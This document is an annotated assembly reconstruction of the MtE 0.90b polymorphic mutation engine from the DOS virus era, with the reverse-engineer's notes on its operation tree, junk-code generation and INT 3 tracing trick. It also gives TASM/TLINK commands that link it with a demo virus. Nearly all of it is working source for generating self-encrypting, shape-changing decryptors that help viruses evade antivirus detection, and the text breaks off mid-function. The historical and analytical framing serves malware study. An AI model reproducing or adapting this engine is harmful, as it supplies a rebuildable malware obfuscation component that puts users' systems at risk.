
;
; MtE 0.90b
;
; This is probably my favourite polymorphic engine from the DOS era, and the
; one that kicked off a trend of releasing engines as an OBJ (TPE, NED, etc).
; This is a byte-for-byte match of the binary, but unfortunately I couldn't
; find TASM 2.5 to get an identical build of the .OBJ.  To assemble:
;
; > tasm /w+ /v /m mte
; > tlink /x /t demovir rnd mte
;
; It took several hours to pull this apart, as the code generation strategy and
; phases weren't immediately obvious without sticking breakpoints into the
; code.  This was made difficult with traditional tools (i.e. debug.exe) by MtE
; requiring an INT 3 handler for tracing during its garbage generation to
; insert a (TEST+)JNZ payload.  Most of the memory references to the scratch
; area throughout the code are done indirectly via [di], I've applied the delta
; to clarify the target of the reference.  This might seem a little awkward
; with '(ops - ops)[si]', but let's err on the side of readability.
;
; The values used in the ops tree (work:ops => es:0).
;
; 0  operand: immediate (unless lower byte is 0)
; 1  operand: target (ax, [ptr_reg], etc) depending on phase
; 2  operand: pointer register (only when phase 1)
; 3  invertible op: sub
; 4  invertible op: add
; 5  invertible op: xor
; 6  invertible op: mul
; 7  invertible op: rol
; 8  invertible op: ror
; 9  junk op: shl
; 10 junk op: shr
; 11 junk op: or
; 12 junk op: and
; 13 junk op: imul
; 14 control flow op: jnz
;
; tree example:
;
; XXX these lines give no indication of left or right?

;           .--------v .---------------------v--v       .--------v------v
; x  ROL--MUL  IMUL  XOR  44625  34945  AND  x  4632  MUL  8955  25355  41667
;      `----|--^  `-------|-------------^ `-----------^----^
;           `-------------'
;
; some optimizations (see try_optimization) are made for generated code with
; ADD/SUB reg,[-2,2] into INC/DEC reg.  impressively, this is also done for "XOR
; reg,-1" into NOT, and is the only time MtE generates NOT.
;
; ROL/ROR/SHL/SHR will also be optimized, with arg clamped in [0,15]:
;   0 don't emit op
;   1 emit arg:1 form
;   2 emit arg:1 form, twice
;   3 arg>7 ? arg=16-arg
;
; structure is as follows:
; 1. intro ops, init pointer reg
; 2. crypt ops
; 3.
;  a. post crypt-ops
;  b. inverse of 3a
; 4. inc/inc ptr, unless an add/sub op on the ptr was adjusted in 3b
; 5. jnz *2
; 6. outro ops
;
; enjoy!
;


MAX_ADD      = 512
MAX_ADD_LEN  = 25                       ; 0x16 + 3
CODE_LEN     = 2100
MAX_LEN      = 1394                     ; sizeof(struc work) + MAX_ADD_LEN

        locals
        public MAX_ADD, MAX_ADD_LEN, CODE_LEN, MAX_LEN
        public CODE_TOP, CODE_START
        public MUT_ENGINE

        .8086
        .model tiny

_TEXT segment

        assume cs:_TEXT,ds:scratch,es:scratch
        extrn RND_INIT:near, RND_GET:near

CODE_START:
                db 'MtE 0.90', 0E1h     ; E1 -> beta-ish in CP437

; IN
;
; es = work segment
; ds:dx = code to encrypt
; cx = length
; bp = offset of execution
; di = offset of code entry point
; si = offset of start address for encrypted code
; bl = routine size (1,3,7,15)
; ax = 0..7 preserve regs,
;      8 will run on different cpu
;      9 don't assume cs = ds
;     10 don't assume cs = ss
;     11 don't align
;
; OUT
;
; es = work segment
; ds:dx = decryption routine + encrypted code
; cx = length
; ax = length that was encrypted (MAX_ADD_LEN)
; di = offset of decryption routine end
; si = offset of loop start

MUT_ENGINE      proc near
                cld
                push    ds
                push    dx
                push    bp
                call    make_enc_and_dec
                mov     bx, dx
                xchg    ax, bp
                pop     dx
                pop     si
                pop     bp
                sub     bx, di
                push    bx
                push    di
                push    cx
                call    encrypt_target
                pop     cx
                pop     si
                mov     di, offset work_top
                sub     di, cx
                push    di
                push    dx
                rep movsb
                pop     cx
                pop     dx
                pop     si
                sub     cx, dx
                sub     di, dx
get_arg_size:   mov     ax, arg_size_neg
                neg     ax
                retn
MUT_ENGINE      endp


make_enc_and_dec proc near
                push    es
                pop     ds
                add     cx, 22          ; MAX_ADD_LEN - 3
                neg     cx
                and     cl, -2
                jnz     @@dont_round_size
                dec     cx
                dec     cx

@@dont_round_size:
                xchg    ax, di
                mov     arg_code_entry, ax
                add     ax, cx
                and     al, -2
                jnz     @@dont_round_end
                dec     ax
                dec     ax

@@dont_round_end:
                push    ax
                xchg    ax, di
                mov     di, offset arg_flags
                stosw
                xchg    ax, cx
                stosw
                xchg    ax, bp
                stosw
                xchg    ax, si
                stosw
                mov     cl, 20h         ; test for shift 0x1f masking
                shl     cl, cl
                xor     cl, 20h
                mov     (is_8086 - reg_set_dec)[di], cl

@@restart:                              ; bp = total_end
                pop     bp
                push    bp
                push    bx              ; bx = amount of junk to make

                call    RND_INIT        ; unusual to srand() multiple times

                ; although di is initially reg_set_dec (arg_flags+8*2), it
                ; won't be on restart!
                mov     di, offset reg_set_dec
                mov     cx, 8
                mov     al, -1
                rep stosb

                mov     di, offset decrypt_stage
                mov     bl, 7           ; XXX bl=7 for pre-loop junk
                call    @@make          ; generates junk on the first call
                dec     di              ; rewind the retf
                cmp     di, offset decrypt_stage
                jz      @@nothing_emitted

                push    dx
                push    di
                push    bp              ; bp = end of generated junk
                mov     ax, 1
                call    exec_enc_stage
                pop     di
                xchg    ax, bp
                stosw                   ; patch the "mov reg,imm16"
                pop     di
                pop     dx

@@nothing_emitted:
                pop     bx
                pop     ax
                xor     bp, bp

@@make:         push    ax
                push    bx

                push    dx
                push    di              ; save pointer into decrypt_stage

                xor     ax, ax
                mov     di, offset jnz_patch_dec
                mov     cx, di          ; 0x63
                rep stosw

                mov     al, 4           ; don't assume cs == ss, needed for the staged encryption
                xchg    al, byte ptr (arg_flags + 1 - op_idx)[di]
                push    ax              ; save old flags

                mov     dx, (arg_size_neg - op_idx)[di]
                mov     di, offset encrypt_stage
                push    bp
                call    g_code          ; make encryptor
                pop     bp
                call    invert_ops

                pop     ax              ; get flags back

                pop     di              ; get the pointer into decrypt_stage back
                pop     dx

                mov     byte ptr arg_flags+1, al
                and     al, 1           ; run on diff cpu?
                sub     is_8086, al     ; if yes: 8086, 0:-1; 286+, 0x20:0x1f
                push    ax
                call    g_code_from_ops ; make decryptor
                pop     ax              ; flags
                add     (is_8086 - ptr_reg)[si], al ; restore val

                xchg    ax, bx
                pop     bx
                ; ax is the second patch point; 0 if g_code failed; 0xff00 if we should loop
                sub     ax, offset patch_dummy
                jb      @@restart       ; loop
                jnz     @@done          ; single ref
                cmp     (arg_start_off - ptr_reg)[si], ax
                jnz     @@restart

@@done:         pop     bx
                retn
make_enc_and_dec endp

encrypt_target  proc near
                add     cx, dx
                mov     dx, di
                xchg    ax, di
                mov     ax, arg_code_entry
                test    ax, ax
                jnz     @@entry_not_zero
                mov     di, offset work_top

@@entry_not_zero:
                mov     bx, offset decrypt_stage

                push    cx
                push    ax

@@fix_pop_loop: cmp     bx, dx
                jz      @@emit_jump
                dec     bx
                mov     al, [bx]
                xor     al, 1
                cmp     al, 61h         ; popa
                jz      @@dont_flip
                xor     al, 9           ; re-flip 1, flip 8 (50..57 -> 58..5f)
@@dont_flip:    stosb
                inc     cx
                jmp     @@fix_pop_loop

@@emit_jump:    pop     dx
                pop     ax

                mov     bx, offset patch_dummy

                test    dx, dx
                jz      @@emit_align_nops

                xchg    ax, cx
                mov     al, 0E9h
                stosb
                mov     bx, di
                xchg    ax, dx
                stosw
                mov     di, offset work_top

@@emit_align_nops:                      ; align?
                test    byte ptr arg_flags+1, 8
                jnz     @@no_align

                neg     cx
                and     cx, 0Fh
                mov     al, 90h         ; nop padding
                rep stosb

@@no_align:     lea     ax, (ops - work_top)[di]
                add     [bx], ax
                and     al, 0FEh
                add     arg_size_neg, ax
                call    get_arg_size
                mov     ds, bp          ; work seg
                shr     ax, 1
                mov     cx, ax
                rep movsw

exec_enc_stage:
                push    di
                push    ax

                xor     cx, cx
                mov     ds, cx
                mov     cx, cs
                mov     bx, offset int_3_handler
                mov     di, 3*4
                cli
                xchg    cx, [di+2]
                xchg    bx, [di]
                sti

                push    cx
                push    bx
                push    di
                push    ds

                push    es
                pop     ds
                push    cs
                mov     bx, offset encrypt_stage
                call    @@jmp_es_bx     ; switch control to the generated encryptor
                xchg    ax, bp          ; set bp to the result of the junk's ax
                pop     es
                pop     di

                cli
                pop     ax
                stosw
                pop     ax
                stosw
                sti

                pop     bx              ; caller's ax
                push    ds
                pop     es

                ; for any encoded JNZs, either
                ; a) if it's never taken, trash the JNZ's destination
                ; b) if it's always taken, trash all the bytes between the jump
                ; and the destination
                mov     di, offset jnz_patch_dec
                xor     si, si
                mov     cx, 21h         ; size of the table
@@find_next_fill:
                xor     ax, ax
                repe scasw
                jz      @@done          ; no fill required
                mov     ax, word ptr (jnz_patch_dec - (jnz_patch_dec+2))[di]
                cmp     ax, si
                jb      @@find_next_fill

                ; never taken?  set JNZ's dest to a random value
                mov     dx, 1
                xchg    ax, si
                mov     ax, word ptr (jnz_patch_hits - (jnz_patch_dec+2))[di]
                cmp     ax, bx        ; caller's ax
                jz      @@fill_loop

                ; always taken?  trash the dead code
                or      ax, ax
                jnz     @@find_next_fill
                lodsb                   ; grab jnz offset
                cbw
                xchg    ax, dx
@@fill_loop:    call    RND_GET         ; junk [si] with dx count
                mov     [si], al
                inc     si
                dec     dx
                jnz     @@fill_loop
                jmp     @@find_next_fill

@@jmp_es_bx:
                push    es
                push    bx
                retf

@@done:         pop     dx
                retn
encrypt_target  endp

; INT 3 handles the (TEST+)JNZ pair.  we record in jnz_patch_hits whether the
; branch is taken
;
; (test reg,reg)
; db 0cch, <offset>
;
; this will become JNZ later in emit_ops's encode_jnz

int_3_handler proc far
        push    bp
        mov     bp, sp
        push    di
        push    cx
        push    bx
        push    ax

        mov     bx, [bp+2]      ; caller's return addr
        mov     al, [bx]        ; get jump offset
        jnz     @@done          ; no zf?  take the jump

        xchg    ax, bx
        mov     di, offset jnz_patch_enc
        mov     cx, 21h
        repne scasw
        inc     word ptr (jnz_patch_hits - (jnz_patch_enc+2))[di]
        mov     al, ch          ; al = 0, jump isn't taken
@@done:
        cbw
        inc     ax
        add     [bp+2], ax
        pop     ax
        pop     bx
        pop     cx
        pop     di
        pop     bp
        iret
int_3_handler endp

make_ops_table  proc near
                mov     di, offset op_idx ; set the three pointers into ops
                mov     ax, 0101h
                stosb
                stosw
                mov     ah, 81h
                mov     word ptr ops, ax ; [ops] = 1,81

@@make_ops_loop:
                call    RND_GET         ; <- argument for op.  also decides the op

; e.g. 5,11,1d,29,35,41,4d => xor [ptr+off]
;      d,19,25,31,3d,49,55 => sub [ptr+off] + neg [ptr+off]
;      f,1b,27,33,3f,4b,47 => add [ptr+off] (enc)
;
; add [ptr+off],arg will be inverted as a
;   mov reg,[ptr+off]
;   sub reg,arg
;
; 0x20 makes a zero op routine, but has the load and store

                xchg    ax, dx
                call    RND_GET         ; <- amount of ops
                mov     bl, (op_next_idx - (op_idx + 3))[di]
                xor     bh, bh
                mov     si, bx
                mov     cx, [si-1]
                cmp     ch, 6           ; currently mul?
                jnz     @@not_mul

@@make_arg_odd:                         ; needs to be odd for gcd
                or      dl, 1
                jmp     @@check_arg

@@not_mul:
                cmp     ch, 86h
                jnz     @@not_mul2
                xor     cl, cl
                inc     bx

@@not_mul2:
                and     al, (junk_len_mask - (op_idx + 3))[di]
                cmp     al, bl
                jnb     @@pick_op       ; made enough ops?

                shr     bl, 1
                jnb     @@check_arg
                or      cl, cl          ; cl = last op
                jz      @@last_op

@@check_arg:                            ; 1 in 256
                or      dl, dl

@@last_op:                              ; data
                mov     al, 0
                jnz     @@save_op_idx
                or      bp, bp
                jnz     @@make_arg_odd
                mov     al, 2           ; ptr

@@save_op_idx:
                or      ch, ch
                jns     @@more_ops
                mov     word ptr (op_end_idx - (op_idx + 3))[di], si
                mov     al, 1           ; end

@@more_ops:
                mov     (ops - ops)[si], al
                jmp     @@sto_arg_loop

@@pick_op:                              ; ax = rand
                xchg    ax, dx
                aam     12              ; al = al % 12
                and     ch, 80h         ; final op flag?
                jz      @@not_crypt_ops
                shr     al, 1           ; al = [0,5], which later becomes [3,8] at the next step
                                        ; i.e. sub, add, xor, mul, rol, ror

@@not_crypt_ops:
                inc     ax              ; using INC to preserve CF
                inc     ax
                inc     ax
                mov     ah, al          ; al = [3,14]
                mov     (ops - ops)[si], al
                mov     dl, (op_free_idx - (op_idx + 3))[di]
                inc     dx
                mov     dh, dl
                inc     dh
                mov     (op_free_idx - (op_idx + 3))[di], dh
                mov     bl, dl
                mov     bh, 0
                mov     cl, bh          ; bh = cl = 0
                jnc     @@switch_args   ; 50/50 when doing crypt ops (c set from the shr above)
                                        ; this is how single-ref routines are created
                cmp     al, 6
                jb      @@sto_op        ; [3,6) = sub,add,xor

@@switch_args:  xchg    cl, ch
@@sto_op:       xor     ax, cx
                mov     (ops - ops)[bx], ax
@@sto_arg_loop: shl     si, 1
                mov     word ptr (ops_args - ops)[si], dx
                inc     byte ptr (op_next_idx - (op_idx + 3))[di]
                mov     al, (op_free_idx - (op_idx + 3))[di]
                cmp     al, (op_next_idx - (op_idx + 3))[di]
                jb      _ret
                jmp     @@make_ops_loop
make_ops_table  endp

encode_mrm_beg  proc near
                dec     bp
encode_mrm:     or      dh, dh          ; dh signed -> bl_op_reg_mrm
                jns     bl_op_reg_mrm   ; MRM is reg,imm
encode_mrm_ptr: mov     dh, (ptr_reg - ptr_reg)[si]
                inc     bp
                jz      encode_mrm_beg
                dec     bp
                jnz     @@load_arg

                push    bx
                mov     bx, (offset @@mrm_byte - 3)
                xchg    al, dh
                xlat    byte ptr cs:[bx]
                cmp     al, 86h         ; bp+off16?
                xchg    al, dh
                xchg    ax, bx
                mov     cl, 2Eh         ; cs: prefix
                mov     al, byte ptr arg_flags+1
                jnz     @@ptr_is_bp
                test    al, 2           ; cs == ds?
                jnz     @@assume_ds
                mov     cl, 3Eh         ; ds: prefix
@@assume_ds:    test    al, 4           ; cs == ss?
                jmp     @@do_seg_override
@@ptr_is_bp:    test    al, 4
                jnz     @@assume_ss
                mov     cl, 36h         ; ss: prefix
@@assume_ss:    test    al, 2
@@do_seg_override:
                jz      @@no_override
                mov     al, cl
                stosb
@@no_override:  pop     ax
                call    encode_op_mrm   ; al = op, bl = reg, dh = rm
                mov     (op_off_patch - ptr_reg)[si], di
                stosw
_ret:           retn

@@load_arg:     mov     dx, bp
                lea     bp, [di+1]
stc_ret:        stc
                retn
@@mrm_byte:     ;   bx   x  bp   si   di
                db  87h, 0, 86h, 84h, 85h

                ; $ cmp -l MTE-090a.OBJ MTE-091b.OBJ
                ; 1014  65 175
                ; 1015 347 112
                ;
                ; MtE 0.90a: 0x35 0xe7
                ; MtE 0.91b: 0x7d 0x4a


                db 7Dh                  ; unused?
                db 4Ah                  ; unused?
encode_mrm_beg  endp


; skip op if dh is signed

encode_mrm_dh_s proc near
                or      dh, dh
                js      encode_mrm_ptr
emit_op_mrm:
                cmp     dh, al
                jz      _ret            ; dont op on the same reg

                cmp     byte ptr (is_8086 - ptr_reg)[si], 0FFh ; 8086: 0, otherwise     0x20
                jnz     bl_op_reg_mrm ; MRM is reg,imm

                push    ax
                or      dh, dh
                jz      @@zero_dest
                or      al, al
                jnz     @@bl_op_reg_mrm_
                mov     al, dh

@@zero_dest:    or      bp, bp
                jnz     @@do_xchg
                cmp     al, (ptr_reg - ptr_reg)[si]
                jz      @@bl_op_reg_mrm_

@@do_xchg:      pop     bx
                or      al, 90h
                stosb
                retn

@@bl_op_reg_mrm_:
                pop     ax

bl_op_reg_mrm:                          ; 0xc0 >> 3
                or      al, 00011000b
                xchg    ax, bx

encode_op_mrm:                          ; al = op, bl = reg, dh = rm
                stosb
                xchg    ax, bx
                mov     cl, 3
                shl     al, cl
                or      al, dh
                stosb
                retn
encode_mrm_dh_s endp

get_op_loc      proc near
                mov     bx, ax
                shr     al, 1
                mov     cx, ax
                shl     cx, 1
                mov     di, (offset ops_args+2)
@@again:        repne scasb
                jnz     stc_ret
                lea     si, (ops - (ops_args+1))[di]
                shr     si, 1
                cmp     byte ptr [si], 3 ; non-op?
                jb      @@again
                lea     ax, (ops - (ops_args+1))[di]
                retn
get_op_loc      endp

invert_ops      proc near
                mov     al, op_end_idx
                cbw
                shl     al, 1
                call    get_op_loc
                jb      @@_ret
                mov     op_idx, al

@@again:        call    get_op_loc
                jnb     @@not_marker
                xor     al, al

@@not_marker:
                push    ax
                shr     al, 1
                mov     (ops_args - ops)[bx], al
                shr     bl, 1
                lahf
                mov     al, (ops - ops)[bx]
                and     al, 7Fh
                cmp     al, 3
                jnz     @@not_sub
                sahf
                jb      @@done
                inc     ax              ; 3 -> 4, sub -> add
                jmp     @@store

@@not_sub:                              ; add
                cmp     al, 4
                jnz     @@maybe_mul
                sahf
                jnc     @@dec_store     ; nc -> change to sub
                mov     si, bx
                mov     cl, 8
                rol     word ptr (ops_args - ops)[bx+si], cl

@@dec_store:    dec     ax
                jmp     @@store

@@maybe_mul:    cmp     al, 6
                jb      @@done
                jnz     @@toggle_rotate

                ; is mul.  set arg to the multiplicative inverse.

                shl     bl, 1
                mov     bl, (ops_args + 1 - ops)[bx]
                shl     bl, 1
                mov     si, word ptr (ops_args - ops)[bx]
                xor     ax, ax
                mov     dx, 1
                mov     cx, ax
                mov     di, dx

@@gcd_loop:     mov     word ptr (ops_args - ops)[bx], di
                dec     si
                jz      @@done
                inc     si
                div     si
                push    dx
                mul     di
                sub     cx, ax
                xchg    cx, di
                mov     ax, si
                xor     dx, dx
                pop     si
                jmp     @@gcd_loop

@@toggle_rotate:
                xor     al, 0Fh         ; toggle 7/8.  rol and ror
@@store:        mov     (ops - ops)[bx], al
@@done:         pop     ax
                or      al, al
                jnz     @@again
                shr     op_idx, 1

@@_ret:         retn

invert_ops      endp


; in
;   dh: target reg
; out
;   dx: value to be set?
g_code          proc near
                mov     junk_len_mask, bl
@@g_code_no_mask:                               ; second entry point, for loop
                push    dx
                push    di
                call    make_ops_table
                pop     di
                pop     dx

g_code_from_ops:                                ; called from make_enc_and_dec, and further down to loop
        push    di

        ; 1. set cx/dx as needed (if dep op was found)
        ; 2. set ax/(bx|bp|si|di) or set (bx|bp|si|di)*2
        ; {{{
        mov     di, offset reg_set_enc
        mov     ax, -1
        stosw                   ; ax and cx available
        inc     al
        stosw                   ; dx unavailable bx available
        stosw                   ; sp unavailable bp available
        dec     al
        stosw                   ; si and di available
        mov     (last_op_flag - ptr_reg)[di], al
        mov     bl, (op_idx - ptr_reg)[di]

        push    bx
        push    dx

        ; walk backwards to check for immediate dependencies on cx/dx
        call    check_reg_deps  ; bl = idx to op

        ; pick a pointer and data reg
        mov     si, di          ; si = 0x14c
        call    ptr_and_r_sto

        pop     dx
        pop     bx
        ; }}}

        pop     di

        ; bp = size_neg => intro junk
        ;      1        => making loop
        ;      0        => making decryptor loop end+outro
        ;     -1        => only when called recursively

        push    bx
        inc     bp
        jz      @@making_junk
        dec     bp
        jnz     @@do_intro_garbage
        inc     bp

        ; phase: -1, 0 {{{
@@making_junk:
        dec     bp

        inc     dx              ; when dx = -1 we're making outro junk
        jz      @@no_mov
        dec     dx

        ; otherwise emit a mov into ptr_reg (dl=0 will be reg,reg)
        dec     bp
        mov     al, (ptr_reg - ptr_reg)[si]
        call    emit_mov        ; writes out the mov index,size_neg
        inc     bp

@@no_mov:
        pop     bx
        push    di
        call    emit_ops        ; loop!
        or      bp, bp
        jnz     @@not_dec_end
        pop     cx

        ; phase=0, making loop end
        dec     bp              ; phase=-1
        mov     ax, offset patch_dummy
        xchg    ax, (op_off_patch - ptr_reg)[si]

        or      dh, dh
        js      @@maybe_null

        ; {{{
        inc     bp

        push    cx
        push    ax

        mov     al, (last_op_flag - ptr_reg)[si]
        and     al, 10110111b
        cmp     al, 10000111b
        jnz     @@do_end_of_loop      ; store/inc/jnz

        cmp     bp, (arg_start_off - ptr_reg)[si] ; start off is zero?
        jnz     @@do_end_of_loop

        xor     byte ptr [di-4], 2 ; change the direction of the op

        ; did we emit sub?
        shl     byte ptr (last_op_flag - ptr_reg)[si], 1
        jns     @@single_ref

        ; negate to correct the result
        mov     bl, 0F7h        ; f7 series op
        mov     al, 3           ; NEG
        jmp     @@emit_eol_bl
        ; }}}

@@maybe_null:
        cmp     cx, (offset decrypt_stage+3)
        jnz     @@not_null

        ; only encoded a mov, rewind
        sub     cx, 3
        sub     di, 3

        ; unmark the register as used
        mov     bl, (ptr_reg - ptr_reg)[si]
        xor     bh, bh
        dec     byte ptr (reg_set_dec - ptr_reg)[bx+si]

@@not_null:
        mov     bx, offset patch_dummy
        jmp     @@size_ok

@@not_dec_end:
        or      dh, dh
        jns     @@making_enc
        mov     dh, (ptr_reg - ptr_reg)[si]
        jmp     @@making_enc
; }}}

; phase > 0 {{{
@@do_intro_garbage:
        push    bp

        call    emit_ops

        ; emits an `XCHG data_reg,AX`
        mov     al, (data_reg - ptr_reg)[si]
        or      al, 90h
        stosb

        pop     ax

        or      dh, dh
        jns     @@making_enc

        xchg    ax, dx          ; dx = size neg

@@making_enc:
        pop     ax
        mov     bh, 0FFh
@@encode_retf:
        mov     byte ptr [di], 0CBh
        retn
; }}}

        ; encode store, inc, and jnz
@@do_end_of_loop:
        ; XCHG reg,r/m
        ; MOV  r/m,reg
        call    RND_GET
        and     al, 2
        add     al, 87h
        xchg    ax, bx
        mov     al, dh
@@emit_eol_bl:
        call    encode_mrm_ptr  ; come here directly when we're negging

@@single_ref:
        mov     al, (ptr_reg - ptr_reg)[si]
        cmp     di, offset encrypt_stage
        jae     @@emit_inc

        ; post crypt ops junk in the decryptor {{{
        ; we generate ops, and then generate the inverse.  this amount of junk
        ; will be halved with the "shr [junk_len_mask],1" for account for the
        ; two calls
        push    ax

        dec     bp              ; phase--
        xor     dl, dl
        mov     dh, al          ; ptr_reg as the target
        shr     byte ptr (junk_len_mask - ptr_reg)[si], 1
        call    @@g_code_no_mask
        push    dx
        push    di
        call    invert_ops
        call    try_ptr_advance
        pop     di
        pop     dx
        push    cx
        call    g_code_from_ops
        pop     cx

        pop     ax
        call    emit_mov        ; emit "mov ptr_reg, reg"

        or      ch, ch          ; did we try_ptr_advance()?
        js      @@emit_jnz      ; found a sub/add connected to x
        ; }}}

@@emit_inc:
        or      al, 40h
        stosb
        stosb

@@emit_jnz:
        mov     al, 75h
        stosb
        pop     bx
        pop     ax
        mov     cx, ax
        sub     ax, di
        dec     ax
        stosb
        or      al, al
        js      @@size_ok

        ; too big
        xor     bx, bx
        retn

@@size_ok:
        call    @@encode_retf
        push    cx
        mov     dx, offset work_top

        ; don't need to make junk and pushes for encryptor
        cmp     di, offset encrypt_stage
        jae     @@patch_offsets

        ; more junk, post loop.  with a "routine size" of 7.
        push    bx
        mov     bl, 7           ; routine size
        mov     dx, bp          ; target reg
        call    g_code

        ; emit pushes before the decryptor, if required {{{
        push    di
        mov     di, (offset decrypt_stage - 1)
        xor     bx, bx
        mov     dx, di
        mov     cl, byte ptr (arg_flags - ptr_reg)[si] ; grab the reg save bitfield from args
@@emit_push_loop:
        shr     cl, 1
        pushf
        jnc     @@dont_emit_push ; save requested?
        cmp     bh, (reg_set_dec - ptr_reg)[bx+si]
        jnz     @@dont_emit_push ; was it actually used?
        lea     ax, [bx+50h]    ; push
        std
        stosb

@@dont_emit_push:
        inc     bx
        popf
        jnz     @@emit_push_loop
        inc     di
        cmp     di, dx
        jnb     @@pushes_done
        cmp     bh, (is_8086 - ptr_reg)[si]
        jnz     @@cant_pusha
        mov     di, dx
        mov     byte ptr [di], 60h ; pusha
        jmp     @@pushes_done

@@cant_pusha:
        push    di
@@randomize_pushes:
        call    RND_GET
        and     al, 7
        cbw
        xchg    ax, bx
        add     bx, di
        cmp     bx, dx
        ja      @@randomize_pushes
        mov     al, [di]
        xchg    al, [bx]
        stosb
        cmp     di, dx
        jnz     @@randomize_pushes
        pop     di
@@pushes_done:
        pop     bp
        ; }}}

        ; finally, adjust offsets
        mov     cx, bp
        sub     cx, di
        cmp     word ptr (arg_code_entry - ptr_reg)[si], 0
        jz      @@entry_is_zero
        add     cx, (offset decrypt_stage+3) ; adjust for code entry not 0
        sub     cx, di
@@entry_is_zero:
        mov     dx, (arg_exec_off - ptr_reg)[si]
        mov     ax, dx
        add     dx, cx
        add     ax, (arg_start_off - ptr_reg)[si]
        pop     bx
        cmp     word ptr (arg_start_off - ptr_reg)[si], 0
        jnz     @@use_start_off

      ; jump here when we're creating enc
@@patch_offsets:
        mov     ax, dx
@@use_start_off:
        call    @@patch
        xchg    ax, dx
        pop     dx
        mov     bx, (op_off_patch - ptr_reg)[si]
@@patch:sub     ax, (arg_size_neg - ptr_reg)[si]
        mov     [bx], ax
        retn
g_code endp


; returns -1 in cx if an add/sub ptr was found (and adjusted)

try_ptr_advance proc near
        xor     cx, cx
        mov     al, op_idx      ; final op index
        cbw
        xchg    ax, bx
        mov     dx, -2          ; -2
        mov     al, (ops - ops)[bx]
        cmp     al, 3           ; sub?
        jz      @@is_sub
        cmp     al, 4           ; add?
        jnz     @@done
        neg     dx              ; 2
@@is_sub:
        shl     bl, 1
        push    bx
        inc     bx
        call    @@fix_arg
        pop     bx
        mov     dx, 2
@@fix_arg:
        mov     bl, (ops_args - ops)[bx]
        cmp     bh, (ops - ops)[bx]     ; operand is immediate?
        jnz     @@done
        mov     si, bx
        add     dx, word ptr (ops_args - ops)[bx+si]
        or      dl, dl
        jz      @@done
        mov     word ptr (ops_args - ops)[bx+si], dx
        dec     cx
@@done:
        retn
try_ptr_advance endp


; marks dx if there's mul/imul
; marks cx if there's jnz->shift
check_reg_deps proc near
        ; bl = node index.  put the node's op into dl.
        xor     bh, bh
        and     byte ptr ops[bx], 7Fh ; remove flag
        mov     dl, ops[bx]

        ; if we've reached an operand leaf node, return the value in bx
        mov     ax, bx
        shl     bl, 1
        mov     bx, word ptr ops_args[bx]
        cmp     dl, 3
        jb      @@ret

        push    ax              ; save cur node index

        ; post order tree traveral
        push    bx              ; save cur node children
        call    check_reg_deps  ; walk right
        pop     bx              ; restore cur node children
        mov     bl, bh
        push    dx              ; save right output
        call    check_reg_deps  ; walk left
        xchg    ax, bx          ; set ax to right's operand (only true if dl<3), or right's child
        pop     cx              ; h=0 if mul else op-6; l=op

        pop     bx              ; cur node index

        ; if the cur op is a mul, mark dx
        mov     dh, ops[bx]     ; current op
        sub     dh, 0Dh         ; 0xd -> imul
        jz      @@mul_
        add     dh, 7           ; 0x6 -> mul
        jnz     @@check_cx
@@mul_: mov     (last_op_flag - ptr_reg)[di], dh
        mov     (reg_set_dec+2 - ptr_reg)[di], dh ; dx
        jmp     @@done

        ; see if we want cx as a target reg
@@check_cx:
        ; is left junk?
        ; skip if the left node op is in (OR,AND,IMUL,JNZ)
        cmp     dh, (11 - 0Dh + 7)
        jnb     @@done

        ; left node is an operand or op in (add,sub,xor,rol,ror,shl,shr)
        ; is the right node an imm value operand?
        or      dl, dl
        jnz     @@need_cx       ; no, mark cx

        ; right node is an imm operand, but don't need it if 286+
        cmp     dl, (is_8086 - ptr_reg)[di]
        jz      @@done

        ; check the lower byte of the immediate value for any sentinels
        ; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
        sub     al, 0Eh
        and     al, 0Fh
        ; [2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1]
        cmp     al, 5
        jnb     @@need_cx     ; 11/16

        ; [0, 1, 2, 14, 15]
        ; [2, 3, 4,  0,  1]
        cmp     al, 2
        jnb     @@done        ; skip sentinels?

        ; {{{
        ; XXX not entirely sure here.  we will not mark cx as required if there
        ; right node is an immediate value, and that immediate value has a
        ; lower nybble of 1110 or 1111...
        ; is it a roundabout way of not loading up cx?  a 1/8 chance?
        ;
        ; 11/16:  need_cx.
        ;  5/16:  3/16:   done.
        ;         2/16:   op shift: need_cx.
        ;                 done.
        ;
        ; so need_cx reached
        ;   P_phase1(11/16 + (2/16 * 2/15))
        ;   P_phasen(11/16 + (2/16 * 0/15)) => P(11/16)
        ;
        ; ... or around 75%?
        ; }}}

        ; we've got JNZ as an op, check if the right child is a shift.
        ; dh is already checked for >= 11 above, so we're clamping on
        ; [9,10].  we need cx to be known to ensure determinism, since
        ; shifts will modify ZF whereas rotates do not.
        cmp     dh, (9 - 0Dh + 7)
        jb      @@done

@@need_cx:                              ; cx
        mov     (reg_set_dec+1 - ptr_reg)[di], bh
        mov     dl, 80h

@@done:
        or      dl, cl
        and     dl, 80h
        or      dl, (ops - ops)[bx]
        mov     (ops - ops)[bx], dl
@@ret:
        retn

check_reg_deps endp

ptr_and_r_sto proc near
        call    @@pick_ptr_reg

        call    RND_GET

        ; do loads into ax?
        and     al, 7
        jz      @@mark_and_emit

        ; generating mul?  we'll need loads into ax
        xor     al, al
        cmp     al, (last_op_flag - ptr_reg)[si]
        jz      @@mark_and_emit

        ; otherwise pick data_reg, find an unused reg from bx,bp,si,di
@@pick_ptr_reg:
        call    RND_GET
        and     al, 3
        jnz     @@not_di
        mov     al, 7
@@not_di:
        xor     al, 4           ; 3, 5, 6, 7

@@mark_and_emit:
        cbw
        mov     bx, ax
        xchg    bh, (reg_set_enc - ptr_reg)[bx+si]
        or      bh, bh          ; already used?
        jz      @@pick_ptr_reg
        stosb
_ret_0:
        retn
ptr_and_r_sto endp

; input
;   bl: node index
emit_ops        proc near

        ; last_op=ff, last_op_flag=80
        mov     word ptr (last_op - ptr_reg)[si], 80FFh
        xor     bh, bh
        mov     al, (ops - ops)[bx]
        and     ax, 7Fh
        shl     bl, 1

        ; 1: node at [bx] is a target operand?
        mov     dx, 0FF00h
        dec     ax
        jz      _ret_0

        ; 2: node at [bx] is a pointer operand?
        mov     dh, (ptr_reg - ptr_reg)[si]
        dec     ax
        jz      _ret_0

        ; 0: node at [bx] is an immediate value operand?
        mov     dx, word ptr (ops_args - ops)[bx]
        js      _ret_0          ; 0? mov aux,imm16

        ; otherwise we've got an op node
        push    ax
        push    dx
        push    bx

        ; walk left {{{
        mov     bl, dh
